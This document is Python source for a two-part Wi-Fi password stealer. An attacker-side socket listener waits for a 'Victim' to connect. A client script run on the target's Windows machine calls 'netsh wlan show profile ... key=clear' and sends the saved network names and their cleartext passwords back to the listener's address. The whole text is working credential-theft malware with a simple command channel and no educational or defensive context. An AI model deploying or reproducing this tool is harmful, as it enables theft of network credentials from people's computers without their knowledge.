import socket
import time
from colorama import *
green = Fore.LIGHTGREEN_EX
init(autoreset=True)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("192.168.1.6", 2008))
server.listen(0)
print("[+] Listening for encoming connections ")
client, addr = server.accept()
print("[+] One CyberSession opened.")
print("[+] Victim connected. Please wait three seconds")
time.sleep(3)
data = client.recv(1048576)
data = data.decode()
print(green + data)
try:
    while True:
        command = input("The profile you want the password > ")
        client.send(command.encode())
        password = client.recv(1048576)
        print(green + password.decode())
except KeyboardInterrupt:
    quit()
except ConnectionResetError:
    print("[+] The connection was closed by the target host")
    quit()
import subprocess
import socket
command = "netsh wlan show profiles"
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.1.6", 2008))
op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
output = op.stdout.read()
output_error = op.stderr.read()
client.send(output + output_error)
while True:
    data = client.recv(1048576)
    data = data.decode()
    if data == "show profiles" or data == "Show profiles":
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)
    else:
        password = "netsh wlan show profile " + data + " key=clear"
        op = subprocess.Popen(password, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)
